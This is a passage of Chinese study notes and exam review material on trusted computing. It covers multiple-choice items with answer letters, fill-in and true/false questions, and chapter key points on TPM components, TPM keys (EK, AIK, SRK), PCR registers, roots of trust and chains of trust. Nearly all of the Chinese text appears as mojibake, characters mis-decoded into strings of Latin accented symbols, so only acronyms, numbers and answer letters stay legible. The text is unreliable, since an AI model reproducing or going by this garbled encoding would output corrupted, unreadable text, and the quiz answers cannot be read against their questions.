7.ä¸‹åˆ—å“ªä¸€é€‰é¡¹å…³äºå¯ä¿¡è®¡ç®—æ˜¯æ­£ç¡®çš„ï¼ˆ D ï¼‰ A. å¯ä¿¡è®¡ç®—çš„æ ¸å¿ƒæ€æƒ³æ˜¯è½¯ä»¶å®‰å…¨æ¨¡å—æ”¯æŒä¸‹çš„å¯ä¿¡è®¡ç®—å¹³å° B. å¯ä¿¡è®¡ç®—å¹³å°ç”±å¯ä¿¡é“¾ã€ ç¡¬ä»¶å¹³å°ã€æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç³»ç»Ÿç»„æˆ C. å¯ä¿¡è®¡ç®—ä¸èƒ½ä»æ ¹æœ¬ä¸Šé˜»æ­¢ç—…æ¯’å’Œé»‘å®¢ç­‰è½¯ä»¶çš„æ”»å‡»ã€‚ D. å¯ä¿¡è®¡ç®—å¯ä»¥ç”¨æ¥æ‰“å‡»åœ¨çº¿æ¸¸æˆä½œå¼Šã€‚ â€‹ è§£æï¼š â€‹ A. æ˜¯ç¡¬ä»¶ P7 â€‹ B. å¯ä¿¡è®¡ç®—å¹³å°ç”±å¯ä¿¡æ ¹ã€ ç¡¬ä»¶å¹³å°ã€æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç³»ç»Ÿç»„æˆã€‚ P7 â€‹ C. ç¡®ä¿ç³»ç»Ÿå…·æœ‰å…ç–«èƒ½åŠ›,ä»æ ¹æœ¬ä¸Šé˜»æ­¢ç—…æ¯’å’Œé»‘å®¢ç­‰è½¯ä»¶çš„æ”»å‡»ã€‚ P8 â€‹ D. å¯ä¿¡è®¡ç®—å¯ä»¥ç”¨æ¥æ‰“å‡»åœ¨çº¿æ¸¸æˆä½œå¼Šã€‚P12 8.åŸºäºå¯†é’¥çš„èº«ä»½è®¤è¯åè®®ä¸­ï¼Œå¼•å…¥æ—¶é—´æˆ³å¯ä»¥( B )ã€‚ A.å®ç°æ—¶é’ŸåŒæ­¥. B.é˜²æ­¢é‡æ”¾æ”»å‡» C.é˜²æ­¢ä¸­é—´äººæ”»å‡» D.é˜²æ­¢çªƒå¬ 9.åœ¨ä»¥ä¸‹è®¤è¯æ–¹å¼ä¸­ï¼Œæœ€å¸¸ç”¨çš„è®¤è¯æ–¹å¼æ˜¯ï¼ˆ A ï¼‰ã€‚ A.åŸºäºè´¦æˆ·å&#x2F;å£ä»¤è®¤è¯ B.åŸºäºæ‘˜è¦ç®—æ³•è®¤è¯ C.åŸºäºPKIè®¤è¯ D.åŸºäºæ•°æ®åº“è®¤è¯ 10.ä¸‹åˆ—å“ªäº›ç®—æ³•ä¸èƒ½ç”¨äºæ•°å­—ç­¾åç®—æ³•? ï¼ˆ D ï¼‰ A.DSS&#x2F;DSA B.RSA C.EIGamal D.RC5 11.ç®¡ç†æ•°å­—è¯ä¹¦çš„æƒå¨æœºæ„CAæ˜¯( D )ã€‚ A. è§£å¯†æ–¹ B. åŠ å¯†æ–¹ C. åŒæ–¹ D. å¯ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ 12.å“ªä¸ªä¸æ˜¯TCGåˆ¶å®šè§„èŒƒä¸­å®šä¹‰çš„å¯ä¿¡è®¡ç®—çš„å±æ€§ï¼Ÿ( D) Aå¯é‰´åˆ«æ€§ Bå®Œæ•´æ€§ Cç§å¯†æ€§ DçœŸå®æ€§ 13.TPMå¯†é’¥çš„èº«ä»½è¯æ˜å¯†é’¥ï¼ˆAIKï¼‰çš„ç›®çš„æ˜¯æ›¿ä»£ï¼ˆ B ï¼‰æ¥æä¾›å¹³å°çš„è¯æ˜ã€‚ Aï¼å­˜å‚¨å¯†é’¥ B. èƒŒä¹¦å¯†é’¥ Cï¼ç­¾åå¯†é’¥ D. ç»‘å®šå¯†é’¥ 14.ï¼ˆ C ï¼‰ä¸ç”±TSSæ ¸å¿ƒæœåŠ¡ï¼ˆTCSï¼‰æ¨¡å—æä¾›ã€‚ Aï¼å¯†é’¥å’Œè¯ä¹¦ç®¡ç† B. äº‹ä»¶ç®¡ç† Cï¼TSPä¸Šä¸‹æ–‡ç®¡ç† D.å®¡è®¡ç®¡ç† 15.ä»¥ä¸‹å…³äºå…¬é’¥åŸºç¡€è®¾æ–½(PKI)çš„è¯´æ³•ä¸­ï¼Œæ­£ç¡®çš„æ˜¯( A ) A. PKIå¯ä»¥è§£å†³å…¬é’¥å¯ä¿¡æ€§é—®é¢˜ B. PKIä¸èƒ½è§£å†³å…¬é’¥å¯ä¿¡æ€§é—®é¢˜ C. PKIåªèƒ½æœ‰æ”¿åºœæ¥å»ºç«‹ D. PKIä¸æä¾›æ•°å­—è¯ä¹¦æŸ¥è¯¢æœåŠ¡ 16.ä»¥ä¸‹å…³äºå¯ä¿¡è®¡ç®—è¯´æ³•é”™è¯¯çš„æ˜¯: ( D ) A. å¯ä¿¡çš„ä¸»è¦ç›®çš„æ˜¯è¦å»ºç«‹èµ·ä¸»åŠ¨é˜²å¾¡çš„ä¿¡æ¯å®‰å…¨ä¿éšœä½“ç³» B. å¯ä¿¡è®¡ç®—æœºå®‰å…¨è¯„ä»·æ ‡å‡†(TCSEC)ä¸­ç¬¬ä¸€æ¬¡æå‡ºäº†å¯ä¿¡è®¡ç®—æœºå’Œå¯ä¿¡è®¡ç®—åŸºçš„æ¦‚å¿µ C. å¯ä¿¡çš„æ•´ä½“æ¡†æ¶åŒ…å«ç»ˆç«¯å¯ä¿¡ã€ç»ˆç«¯åº”ç”¨å¯ä¿¡ã€æ“ä½œç³»ç»Ÿå¯ä¿¡ã€ç½‘ç»œäº’è”å¯ä¿¡ã€äº’è”ç½‘äº¤æ˜“ç­‰åº”ç”¨ç³»ç»Ÿå¯ä¿¡ D. å¯ä¿¡è®¡ç®—å¹³å°å‡ºç°åä¼šå–ä»£ä¼ ç»Ÿçš„å®‰å…¨é˜²æŠ¤ä½“ç³»å’Œæ–¹æ³• 17.ä»¥ä¸‹å…³äºå¯ä¿¡å­˜å‚¨æ ¹ç®¡ç†åŠŸèƒ½åŒ…å«ä»¥ä¸‹ï¼ˆ D ï¼‰ A.å¯†é’¥ç®¡ç† B.å¯†é’¥äº§ç”Ÿ C.åŠ å¯†å’Œè§£å¯† D.ä»¥ä¸Šéƒ½æ˜¯ 18.MD5æ–‡æ‘˜ç®—æ³•å¾—å‡ºçš„æ–‡æ‘˜å¤§å°æ˜¯ï¼Ÿï¼ˆ A ï¼‰ A 128ä½ B 160ä½ C 128å­—èŠ‚ D 160å­—èŠ‚ 19.æ„å»ºå¯ä¿¡è®¡ç®—å¹³å°çš„åŸºç¡€æ¨¡å—æ˜¯ï¼ˆA ï¼‰ A. å®‰å…¨å¯åŠ¨ç³»ç»Ÿ B. å¯ä¿¡å¹³å°æ¨¡å— C. å®‰å…¨åå¤„ç†å™¨ D. å¯†ç åŠ é€Ÿå™¨ 20.åœ¨TSSä¸­ï¼Œä»¥ä¸‹å“ªäº›ä¸æ˜¯å¯ä¿¡æ ¸å¿ƒæœåŠ¡å±‚TCSæä¾›çš„æ ¸å¿ƒæœåŠ¡ï¼Ÿ ï¼ˆ C ï¼‰ A.ä¸Šä¸‹æ–‡ç®¡ç† B.å¯†é’¥ä¸è¯ä¹¦ç®¡ç† C.è®¾å¤‡é©±åŠ¨ç®¡ç† D.äº‹ä»¶ç®¡ç† 21.ä¸‹åˆ—å“ªä¸€é¡¹ä¸æ˜¯TPMçš„æ ¸å¿ƒåŠŸèƒ½ï¼ˆ C ï¼‰ A.è¿œç¨‹è¯æ˜ B.æ•°æ®ä¿æŠ¤ C.å‚¨å­˜å™¨å±è”½ D.å¯†é’¥ç®¡ç† å¡«ç©ºé¢˜ TPMéƒ¨ä»¶ä½“ç³»ç»“æ„å¯åŒ…æ‹¬ä¸º:åˆ†ç¦»éƒ¨ä»¶ã€é€šä¿¡æ¥å£ã€é˜²ç¯¡æ”¹æ”»å‡»å°è£… ä¸‰å¤§ç±»ã€‚ å¯ä¿¡è®¡ç®—çš„å‘å±•é˜¶æ®µï¼šç¡¬ä»¶å¯ä¿¡é˜¶æ®µã€ç»¼åˆå¯ä¿¡é˜¶æ®µã€æ·±å…¥å‘å±•é˜¶æ®µã€‚ å¯ä¿¡æœºåˆ¶åˆ†ä¸ºå¯ä¿¡åº¦é‡æœºåˆ¶ã€å¯ä¿¡å­˜å‚¨æœºåˆ¶ã€å¯ä¿¡æŠ¥å‘Šå’Œå¯ä¿¡è®¤è¯æœºåˆ¶ã€‚ ä¸€ä¸ªCAåˆ›å»ºçš„å‡­è¯é€šå¸¸ç§°ä¸ºï¼šè®¤è¯å¯†é’¥è¯ä¹¦ å¯ä¿¡è®¡ç®—çš„æ ¸å¿ƒé—®é¢˜å¯ä»¥å½’ç»“ä¸ºï¼šä¿¡ä»»é—®é¢˜ åœ¨å¯ä¿¡è®¡ç®—å¹³å°ä¸­ï¼Œä¸€èˆ¬æœ‰24ä¸ªPCRå¯„å­˜å™¨ã€‚æ¯ä¸ªå¯„å­˜å™¨éƒ½å­˜å‚¨ç‰¹å®šçš„æ•£åˆ—å€¼0åˆ°7ç”¨äºç³»ç»Ÿå¯åŠ¨ï¼Œ8åˆ°15ç»™æ“ä½œç³»ç»Ÿä½¿ç”¨ï¼Œ16åˆ°23ç”¨äºåŠ¨æ€å¯ä¿¡æ ¹çš„å»ºç«‹ Diffie-Hellmanç®—æ³•æ˜¯ç¬¬ä¸€ä¸ªå…¬é’¥ç®—æ³•ã€‚ ä¿¡ä»»é“¾åˆ†ä¸ºåŠ¨æ€ä¿¡ä»»é“¾å’Œé™æ€ä¿¡ä»»é“¾ã€‚ å¹³å°èº«ä»½è¯æ˜åˆ†ä¸ºPrivacy CAæ–¹æ¡ˆå’ŒDAAæ–¹æ¡ˆã€‚ CAæ˜¯PKIçš„æ ¸å¿ƒæ‰§è¡Œæœºæ„ï¼Œæ˜¯PKIçš„ä¸»è¦ç»„æˆéƒ¨åˆ†ï¼Œä¸šç•Œäººå£«é€šå¸¸ç§°ä»–ä¸ºè®¤è¯ä¸­å¿ƒ ã€‚ ä¿¡ä»»é“¾çš„æ ¸å¿ƒå’Œèµ·ç‚¹æ˜¯ è®¡ç®—æœºå¯ä¿¡æ ¹ ã€‚ æ•°å­—è¯ä¹¦æ˜¯å°†è¯ä¹¦æŒæœ‰è€…çš„èº«ä»½ä¿¡æ¯å’Œå…¶æ‰€æ‹¥æœ‰çš„å…¬é’¥è¿›è¡Œç»‘å®šçš„æ–‡ä»¶ã€‚ èº«ä»½ä¿¡ä»»é‡‡ç”¨é™æ€éªŒè¯æœºåˆ¶ï¼Œå¸¸ç”¨çš„æŠ€æœ¯åŒ…æ‹¬è®¤è¯ã€æˆæƒã€åŠ å¯†ç­‰ã€‚ åœ¨TSSç»“æ„ä½“ç³»ä¸­ï¼ŒTPMè®¾å¤‡é©±åŠ¨åº“ï¼ˆTDDLï¼‰ä»¥ç”¨æˆ·æ¨¡å¼è¿è¡Œã€‚ å¯ä¿¡è®¡ç®—å¹³å°é€šç”¨ä½“ç³»æ¶æ„åˆ†ä¸º3ä¸ªå±‚æ¬¡ï¼šåŸºç¡€ç¡¬ä»¶å±‚ã€å¯ä¿¡æœåŠ¡å±‚ã€å®‰å…¨åº”ç”¨å±‚ã€‚ å…¬é’¥åŸºç¡€è®¾æ–½(PKI):æ˜¯ä¸€ä¸ªç”¨**éå¯¹ç§°å¯†ç ç®—æ³•ï¼ˆæˆ–å…¬é’¥å¯†ç )**åŸç†å’ŒæŠ€æœ¯æ¥å®ç°å¹¶æä¾›å®‰å…¨æœåŠ¡çš„ã€å…·æœ‰é€šç”¨æ€§çš„å®‰å…¨åŸºç¡€è®¾æ–½ã€‚ TPMå®‰å…¨ç®¡ç†å¯†é’¥çš„ç”Ÿæˆã€ä½¿ç”¨å’Œå­˜å‚¨ï¼ŒåŒ…æ‹¬èƒŒä¹¦å¯†é’¥ã€å­˜å‚¨å¯†é’¥ã€ç­¾åå¯†é’¥ã€èº«ä»½è¯æ˜å¯†é’¥ã€ç»‘å®šå¯†é’¥ã€ç»§æ‰¿å¯†é’¥ã€éªŒè¯å¯†é’¥ã€‚ TPMå¯ä¿¡å¹³å°æ¨¡å—ï¼Œæœ¬èº«æ˜¯ä¸€ç§SOCèŠ¯ç‰‡ï¼Œæ˜¯å¯ä¿¡è®¡ç®—å¹³å°çš„ä¿¡ä»»æ ¹ã€‚ åˆ¤æ–­é¢˜ ä¿¡ä»»å¯ä»¥åˆ†ä¸ºèº«ä»½ä¿¡ä»»å’Œç›´æ¥ä¿¡ä»»ä¸¤éƒ¨åˆ†ã€‚ï¼ˆÃ—ï¼‰ æ¯ä¸ªTPMæ‹¥æœ‰å”¯ä¸€çš„EK ã€‚ ï¼ˆâˆšï¼‰ å¯ä¿¡æœºåˆ¶æ˜¯ä¿éšœå¯ä¿¡è®¡ç®—å¹³å°å®‰å…¨å¯è¡Œçš„æœºåˆ¶ã€‚ï¼ˆâˆšï¼‰ ä¸€ä¸ªå®ä½“å¦‚æœå®ƒçš„è¡Œä¸ºæ€»æ˜¯ä»¥é¢„æœŸçš„æ–¹å¼ï¼Œè¾¾åˆ°é¢„æœŸçš„ç›®æ ‡ï¼Œåˆ™è¿™ä¸ªå®ä½“å°±æ˜¯å¯ä¿¡çš„ã€‚ ï¼ˆâˆšï¼‰ å¯ä¿¡å¼ºè°ƒè¡Œä¸ºç»“æœå¯é¢„æœŸï¼Œä½†å¹¶ä¸ç­‰äºç¡®è®¤è¡Œä¸ºæ˜¯å®‰å…¨çš„ã€‚ï¼ˆâˆšï¼‰ TPMå¯†é’¥çš„ç­¾åå¯†é’¥æ˜¯å¯¹ç§°å¯†é’¥ã€‚ ï¼ˆ Ã— ï¼‰ è¿œç¨‹è¯æ˜æ˜¯é€šè¿‡â€œæŒ‘æˆ˜â€-â€œåº”ç­”â€åè®®æ¥å®ç°çš„ã€‚ ï¼ˆ âˆš ï¼‰ å…¬é’¥åŸºç¡€è®¾æ–½æ—¶åˆ»ä¸€ä¸ªç”¨éå¯¹ç§°å¯†ç ç®—æ³•åŸç†å’ŒæŠ€æœ¯å®ç°çš„ã€å…·æœ‰é€šç”¨æ€§çš„å®‰å…¨åŸºç¡€è®¾æ–½ã€‚ï¼ˆâˆš ï¼‰ TSSæ¨¡å—ä¸­ï¼ŒTSPï¼ˆå¯ä¿¡æœåŠ¡æä¾›è€…ï¼‰çš„åŠŸèƒ½æ˜¯æä¾›å…¬å…±æœåŠ¡çš„é›†åˆã€‚ï¼ˆÃ—ï¼‰ ï¼ˆæ­£ç¡®åŠŸèƒ½åº”è¯¥æ˜¯æœ¬åœ°å’Œè¿œç¨‹çš„å¯ä¿¡ä»£ç†ï¼Œä½äºä¹¦P51ï¼‰ è€ƒç‚¹ç¬¬ä¸€ç« ï¼ˆé‡ç‚¹ï¼‰å¯ä¿¡è®¡ç®—çš„å®šä¹‰ï¼š ä¸€ä¸ªå®ä½“å¦‚æœå®ƒçš„è¡Œä¸ºæ€»æ˜¯ä»¥é¢„æœŸçš„æ–¹å¼ï¼Œè¾¾åˆ°é¢„æœŸçš„ç›®æ ‡ï¼Œåˆ™è¿™ä¸ªå®ä½“å°±æ˜¯å¯ä¿¡çš„ã€‚ æ¸…æ¥šå®ƒçš„å¯åŠ¨è¿‡ç¨‹ï¼š è¦çœ‹ç¬¬ä¸€ç« å®è§‚çš„è¿™äº›åŸºæœ¬çŸ¥è¯† ç¬¬äºŒç« ï¼ˆé‡ç‚¹ï¼‰TPMæ¦‚è¿°ï¼š TPMå¯ä¿¡å¹³å°æ¨¡å—æ˜¯ä¸€é¡¹å®‰å…¨èŠ¯ç‰‡çš„å›½é™…æ ‡å‡†ï¼Œæ—¨åœ¨ä½¿ç”¨è®¾å¤‡ä¸­é›†æˆçš„ä¸“ç”¨å¾®æ§åˆ¶å™¨å®‰å…¨ç¡¬ä»¶å¤„ç†è®¾å¤‡ä¸­çš„åŠ å¯†å¯†é’¥ã€‚ æ˜¯å¸¦å¯†ç è¿ç®—åŠŸèƒ½çš„å®‰å…¨èŠ¯ç‰‡ï¼Œé€šè¿‡æ€»çº¿ä¸PCèŠ¯ç‰‡è¿åœ¨ä¸€èµ· å¯ä¿¡ï¼š TCGåŸºäºæ ‡è¯†å¹³å°çš„ç¡¬ä»¶å’Œè½¯ä»¶ç»„ä»¶çš„æ–¹æ³•æ¥æ„å»ºå¹³å°å¯ä¿¡çš„å®‰å…¨æœºåˆ¶ã€‚TPMæä¾›æ”¶é›†å’ŒæŠ¥å‘Šè¿™äº›æ ‡è¯†ä¿¡æ¯ï¼ˆèº«ä»½ä¿¡æ¯ï¼‰çš„æ–¹æ³•ã€‚ å®‰å…¨èŠ¯ç‰‡ï¼š æœ‰æ•ˆåœ°ä¿æŠ¤PCã€é˜²æ­¢éæ³•ç”¨æˆ·è®¿é—®ã€‚ å…·æœ‰äº§ç”ŸåŠ è§£å¯†å¯†é’¥çš„åŠŸèƒ½ å……å½“ä¿æŠ¤BIOSå’Œæ“ä½œç³»ç»Ÿä¸è¢«ä¿®æ”¹çš„è¾…åŠ©å¤„ç†å™¨ TPMåŒ…å«å“ªäº›æ¨¡å—ï¼Œæœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Ÿï¼ˆP18ï¼‰ è¾“å…¥&#x2F;è¾“å‡ºï¼šå¤„ç†é€šä¿¡æ€»çº¿æ•°æ®æµã€‚ éæ˜“å¤±æ€§å­˜å‚¨å™¨ï¼šç”¨æ¥å­˜æ”¾EKã€SRKã€æ‰€æœ‰è€…çš„æˆæƒæ•°æ®å’Œæ°¸ä¹…æ ‡è¯†ã€‚ PCRï¼šå¹³å°é…ç½®å¯„å­˜å™¨ï¼Œæ˜¯ç”¨æ¥è®°å½•ç³»ç»Ÿè¿è¡ŒçŠ¶æ€çš„å¯„å­˜å™¨ï¼Œæ˜¯TPMçš„æ ¸å¿ƒå™¨ä»¶ã€‚ AIKï¼šæ°¸ä¹…ä¸å˜ ç¨‹åºä»£ç ï¼šç”¨äºæµ‹é‡å¹³å°è®¾å¤‡çš„å›ºä»¶ã€‚ éšæœºæ•°å‘ç”Ÿå™¨ï¼šç”¨äºå¯†é’¥çš„ç”Ÿæˆï¼Œäº§ç”Ÿnonceå’Œå¢å¼ºå£ä»¤è®¿é—®çš„ç†µ SHA-1åŠ é€Ÿå™¨ï¼šç”¨äºè®¡ç®—æ•°å­—ç­¾åï¼Œäº§ç”Ÿå¯†é’¥æ®µå’Œå…¶ä»–å¸¸è§„åº”ç”¨ã€‚ RSAå¯†é’¥äº§ç”Ÿå™¨ï¼šäº§ç”Ÿç­¾åå’Œå­˜å‚¨å¯†é’¥ã€‚ RSAåŠ é€Ÿå™¨ï¼šä½¿ç”¨ç­¾åå¯†é’¥è¿›è¡Œæ•°å­—ç­¾åï¼Œç”¨å­˜å‚¨å¯†é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ã€‚ é€‰æ‹©è¿›å…¥ï¼šç¡®å®šç‰©ç†å­˜åœ¨çŠ¶æ€çš„é€»è¾‘å’Œæ¥å£ï¼Œç¡®ä¿åº”ç”¨åˆ°å…¶ä»–TPMéƒ¨ä»¶çš„ç¦ç”¨æ“ä½œæ˜¯å¦è¢«æ‰§è¡Œã€‚ æ‰§è¡Œå¼•æ“ï¼šæ‰§è¡Œç¨‹åºä»£ç ï¼Œå®ŒæˆTPMçš„åˆå§‹åŒ–å’Œæµ‹é‡æ“ä½œã€‚ TPMæœ‰å“ªäº›å¯†é’¥ï¼Ÿï¼ˆP24ï¼‰ èƒŒä¹¦å¯†é’¥EKï¼š è¯æ˜å¹³å°å¯ä¿¡ï¼Œå¯¹TPMæ¥è¯´ï¼Œæ˜¯å”¯ä¸€çš„æ ‡è¯†ã€‚ æ˜¯ä¸€ä¸ª2048æ¯”ç‰¹çš„RSAå…¬ç§é’¥å¯¹ã€‚ ä¸ç”¨åšæ•°æ®çš„åŠ å¯†å’Œç­¾åã€‚ éè¿ç§»çš„è§£å¯†å¯†é’¥ã€‚è§£å¯†æ‰€æœ‰è€…çš„æˆæƒæ•°æ®å’Œäº§ç”ŸAIKç›¸å…³æ•°æ®ã€‚ èº«ä»½è¯æ˜å¯†é’¥ï¼ˆAIKï¼‰ï¼š ä»£æ›¿EKï¼Œæ¥æä¾›å¹³å°çš„è¯æ˜ã€‚ å­˜å‚¨æ ¹å¯†é’¥ï¼ˆSRKï¼‰ï¼ˆå¯ä¿¡å­˜å‚¨æ ¹ï¼‰ï¼š æ‹¥æœ‰æœ€é«˜æƒé™çš„Storage Key SRKç§é’¥é©»ç•™åœ¨TPMå†…éƒ¨ï¼Œä¸è¢«å¯¼å‡º ç”±å®ƒæ¥ä¹‹é—´æˆ–é—´æ¥çš„åŠ å¯†ä¿æŠ¤åç»­ç”Ÿæˆçš„å¯†é’¥ ç­¾åå¯†é’¥ï¼š Signing Key éå¯¹ç§°å¯†é’¥ï¼Œç”¨äºä¿¡æ¯å’Œæ•°æ®çš„ç­¾å å¯è¿ç§»å’Œä¸å¯è¿ç§»éƒ½è¡Œ ç»‘å®šå¯†é’¥ï¼š BindingKeyåŠ å¯†ä¿æŠ¤TPMå¤–éƒ¨çš„ä»»æ„æ•°æ® å¯è¿ç§» ç»§æ‰¿å¯†é’¥ï¼š Legacy Key æ—¢å¯ä»¥ç”¨äºç­¾åä¹Ÿå¯åŠ å¯† ç”¨åœ¨å¹³å°é—´ä¼ é€’æ•°æ®çš„åœºåˆ éªŒè¯å¯†é’¥ï¼š Authentication Keyç”¨äºä¿æŠ¤è¿ç”¨TPMå®Œæˆçš„ä¼ è¾“ä¼šè¯ã€‚ å¤šä¸ªTPMé—´ã€æ™®é€šPCå’Œæœ‰TPMå¹³å°çš„è¿œç¨‹é€šä¿¡çš„æ•°æ®æ®µï¼Œè¿›è¡Œå¯¹ç§°åŠ å¯† AIKå’ŒEKæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ EKï¼šTPMå”¯ä¸€æ ‡è¯†ã€‚ AIKï¼šAIKå¯†é’¥æ˜¯EKå¯†é’¥çš„æ›¿ä»£è€…ï¼Œåˆ©ç”¨AIKå¯†é’¥å¯ä»¥è¿›è¡Œç­¾åä¸åŠ å¯†ç­‰æ“ä½œ å…³ç³»ï¼šAIKå¯ä»¥çœ‹ä½œæ˜¯EKçš„â€œåˆ«åâ€ï¼ŒEKåªæœ‰ä¸€å¯¹ï¼Œä½†EKå¯ä»¥å¯¹åº”å¤šå¯¹AIKã€‚ ä¸ºä»€ä¹ˆæœ‰äº†EKè¿˜è¦AIKï¼Ÿ ä¸ºä¿è¯EKçš„å®‰å…¨ï¼Œé¿å…ä½¿ç”¨EKã€‚EKæ˜¯é‡è¦çš„ç§æœ‰ä¿¡æ¯ï¼Œç”¨EKåŠ å¯†æˆ–ç­¾åæ•°æ®ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šä»è¢«åŠ å¯†çš„æ•°æ®ä¸­è·å–EKçš„ç›¸å…³ä¿¡æ¯è€Œæ”»å‡»TPMï¼Œå¹³å°èº«ä»½å¯†é’¥AIKç”±æ­¤äº§ç”Ÿï¼ˆAttestation Identity Keyï¼‰ å…¬é’¥åŠ å¯†ç®—æ³•ï¼ˆP22ï¼‰ å…¬é’¥ç®—æ³•åœ¨å¯ä¿¡è®¡ç®—é‡Œæ‰®æ¼”ç€ä»€ä¹ˆæ ·çš„è§’è‰²ï¼Ÿ å…¬é’¥å¯†ç ç®—æ³•å…‹æœäº†å¯¹ç§°å¯†ç çš„ç¼ºé™·ï¼Œèƒ½å¤Ÿé€šè¿‡å…¬å¼€çš„ä¿¡é“è¿›è¡Œå¯†é’¥äº¤æ¢ã€‚ å…¬é’¥ç®—æ³•æ˜¯è°æå‡ºçš„ï¼Ÿ Diffieå’ŒHellmanäº1976å¹´æå‡ºï¼Œå…¶å®‰å…¨æ€§æºäºæœ‰é™åŸŸä¸Šè®¡ç®—ç¦»æ•£å¯¹æ•°å›°éš¾æ€§é—®é¢˜ã€‚ ç¬¬ä¸€ä¸ªå…¬é’¥ç®—æ³•ï¼Ÿ Diffie-Hellmanç®—æ³•ã€‚ å…¬é’¥å’Œç§é’¥çš„ä½œç”¨ï¼Ÿ ç§é’¥ç­¾åï¼Œå…¬é’¥éªŒè¯ç­¾åã€‚ ç§é’¥è§£å¯†ï¼Œå…¬é’¥åŠ å¯†ã€‚ ç¬¬ä¸‰ç« å¯ä¿¡æ ¹æ¦‚å¿µï¼š å¯ä¿¡æ ¹æ˜¯ä¿¡ä»»åŸºç‚¹ï¼Œæ˜¯ä¿¡ä»»é“¾çš„æ ¸å¿ƒï¼Œæ˜¯æ‰€æœ‰ç³»ç»Ÿè¡Œä¸ºå®Œæ•´æ€§çš„æµ‹é‡åŸºç¡€ã€‚ å¦‚ä½•å»ºç«‹ä¿¡ä»»ï¼Ÿå¦‚ä½•è¡¡é‡ä¿¡ä»»ï¼Ÿ ä¿¡ä»»é“¾çš„ä¼ é€’æœºåˆ¶ï¼šä»å¯ä¿¡æ ¹å‡ºå‘ï¼Œæ¯ä¸€æ¬¡å¹³å°è½¬æ¢ä¿¡ä»»å…³ç³»éƒ½å¯ä»¥é€šè¿‡ä¼ é€’çš„æ–¹å¼ä¿æŒä¸‹å»ä¸è¢«ç ´åï¼Œé‚£ä¹ˆå¹³å°ä¸Šçš„è®¡ç®—ç¯å¢ƒå§‹ç»ˆæ˜¯å¯ä¿¡çš„ï¼Œåœ¨è¯¥ç¯å¢ƒä¸‹çš„æ“ä½œä¹Ÿä¸ä¼šç ´åå¹³å°çš„å¯ä¿¡ã€‚å¹³å°æœ¬èº«çš„å®Œæ•´æ€§å¾—åˆ°ä¿è¯ï¼Œç»ˆç«¯å®‰å…¨ä¹Ÿå¾—åˆ°ä¿è¯ã€‚ä¿¡ä»»é“¾çš„èµ·ç‚¹ï¼Œå¯ä¿¡æ ¹ã€‚ å¦‚ä½•æŠŠä¿¡ä»»ä¼ é€’ä¸‹å»ï¼Ÿï¼ˆä¿¡ä»»é“¾ï¼‰ ä»å¯ä¿¡æ ¹å¼€å§‹ï¼Œé€šè¿‡å®Œæ•´æ€§åº¦é‡å’Œå®Œæ•´æ€§å­˜å‚¨æŠ€æœ¯å¯¹ä»£ç çš„å¯ä¿¡èµ–æ€§è¿›è¡Œåº¦é‡å’Œè®°å½•ï¼Œå®ç°ä¿¡ä»»çš„é“¾å¼ä¼ é€’ï¼Œå¹¶æ‰©å¤§åˆ°æ•´ä¸ªç³»ç»Ÿã€‚ä¹‹ååˆ©ç”¨å®Œæ•´æ€§æŠ¥å‘ŠæŠ€æœ¯å®ç°ä»ç»ˆç«¯åˆ°ç½‘ç»œçš„ä¼ é€’ã€‚ å¯ä¿¡æ ¹åˆ†ä¸ºä¸‰ä¸ªç±»å‹ï¼Œäº†è§£è¿™å‡ ä¸ªå¯ä¿¡æ ¹ï¼ŒçŸ¥é“å®ƒä»¬ä»£è¡¨ä»€ä¹ˆæ„æ€ï¼Œä»€ä¹ˆä½œç”¨ï¼Œæœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Ÿ å¯ä¿¡åº¦é‡æ ¹ï¼ˆRTMï¼‰ï¼šç”¨äºç”Ÿæˆå›ºæœ‰çš„å¯ä¾èµ–çš„å®Œæ•´æ€§åº¦é‡å€¼çš„è®¡ç®—éƒ¨ä»¶ï¼Œå¯æµ‹é‡ä»»ä½•ç”¨æˆ·å®šä¹‰çš„å¹³å°é…ç½®ã€‚ å¯ä¿¡å­˜å‚¨æ ¹ï¼ˆRTSï¼‰ï¼šå®Œæˆå¯†é’¥ç®¡ç†ã€å¯†é’¥äº§ç”Ÿã€åŠ å¯†ã€è§£å¯† å¯ä¿¡æŠ¥å‘Šæ ¹ï¼ˆRTRï¼‰ï¼šå…è®¸å—TPMä¿æŠ¤çš„åŒºåŸŸä¸­çš„æ•°æ®å¯ä»¥è¢«éªŒè¯é€šè¿‡çš„éœ€æ±‚è€…è·å–ï¼ˆéæ˜“å¤±æ€§å†…å­˜+PCRï¼‰ã€‚PCRæ•°æ®çš„çœŸå®æ€§éœ€è¦RTRç”¨ç­¾åå¯†é’¥ç­¾åè¯å®ã€‚ å¯ä¿¡ä¼ é€’å¯ä¿¡æ ¹ç¡®è®¤ä¸‹ä¸€çº§çš„å¯ä¿¡åº¦ï¼Œä¸‹ä¸€çº§è‹¥æ˜¯å¯ä¿¡çš„ï¼Œåˆ™å¯ä¿¡èŒƒå›´ä»å¯ä¿¡æ ¹ä¼ é€’åˆ°ä¸‹ä¸€çº§ã€‚ä»¥æ­¤ç±»æ¨ï¼Œè¿‡ç¨‹é‡å¤ï¼Œå®ç°å¯ä¿¡ç³»ç»Ÿå¯ä¿¡èŒƒå›´çš„å»¶ä¼¸ã€‚ æ ¹æ®PCå¯åŠ¨çš„è¿‡ç¨‹ä¼ é€’ã€‚ å¯ä¿¡åº¦é‡å¯¹ä»£ç ç¨‹åºåŠå…¶ç›¸å…³é…ç½®çš„å®Œæ•´æ€§éªŒè¯ã€‚ ç”Ÿæˆhashå€¼ï¼ŒæŠŠhashä¼ åˆ°PCRé‡Œ å¯ä¿¡åº¦é‡å®Œæ•´æ€§åˆ†ä¸ºä¸¤æ–¹é¢ï¼š ç¬¬ä¸€æ–¹é¢ï¼šé™æ€å¯ä¿¡åº¦é‡ï¼šå®Œæ•´æ€§åŸºå‡†å€¼çš„å»ºç«‹ã€‚ ä¿¡ä»»é“¾çš„å»ºç«‹ï¼š è·å¾—å¯ä¿¡è®¤è¯ä¸­å„é˜¶æ®µçš„è®¤è¯ æŠŠåŸºå‡†å€¼å­˜åˆ°å®‰å…¨åŒºåŸŸ 